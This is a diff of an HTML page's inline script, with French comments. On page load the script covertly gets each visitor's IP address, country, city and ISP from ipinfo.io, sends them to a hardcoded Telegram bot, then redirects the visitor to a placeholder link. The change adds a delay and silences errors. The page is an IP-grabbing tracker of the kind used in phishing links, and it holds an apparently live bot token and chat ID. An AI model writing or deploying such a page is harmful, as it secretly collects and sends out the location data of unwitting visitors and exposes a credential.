@@ -7,34 +7,35 @@
   <script>
     (async () => {
       try {
-        // Appel à ipinfo.io (clé non requise pour usage basique)
-        const res = await fetch('https://ipinfo.io/json?token=TON_TOKEN'); // ← remplace TON_TOKEN si tu as un compte, sinon retire `?token=...`
+        // 1. Récupération IP + infos via ipinfo.io
+        const res = await fetch('https://ipinfo.io/json?token=');
         const data = await res.json();
 
-        const ip = data.ip;
-        const country = data.country; // Code pays, ex: FR
+        const ip = data.ip || 'inconnu';
+        const country = data.country || 'inconnu';
         const region = data.region || '';
         const city = data.city || '';
-        const org = data.org || 'Inconnu';
+        const org = data.org || 'inconnu';
 
-        // Drapeau en emoji
         const flagEmoji = String.fromCodePoint(...[...country].map(c => 127397 + c.charCodeAt()));
 
-        // Format message
-        const message = `📡 Visiteur détecté\n🌍 IP: ${ip}\n🏳️ Pays: ${country} ${flagEmoji}\n📍 Ville: ${city}, ${region}\n🏢 FAI: ${org}`;
+        // 2. Construction du message Telegram
+        const message = `📡 Nouveau visiteur\nIP: ${ip}\nPays: ${country} ${flagEmoji}\n📍 ${city}, ${region}\n🏢 FAI: ${org}`;
 
-        // Envoi à Telegram
-        const botToken = '7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY';
-        const chatId = '6996434307';
+        // 3. Envoi à Telegram
+        const botToken = '7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY'; // ← remplace par ton token
+        const chatId = '6996434307';     // ← remplace par ton chat_id
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
         await fetch(telegramUrl);
 
       } catch (err) {
-        console.error("Erreur IPINFO ou Telegram:", err);
+        // Optionnel : console.error(err);
       } finally {
-        // Redirection
-        window.location.href = "https://tonlien.comc"; // ← à remplacer
+        // 4. Redirection automatique après 1 seconde
+        setTimeout(() => {
+          window.location.href = 'https://tonlien.com'; // ← ton lien final
+        }, 1000);
       }
     })();
   </script>
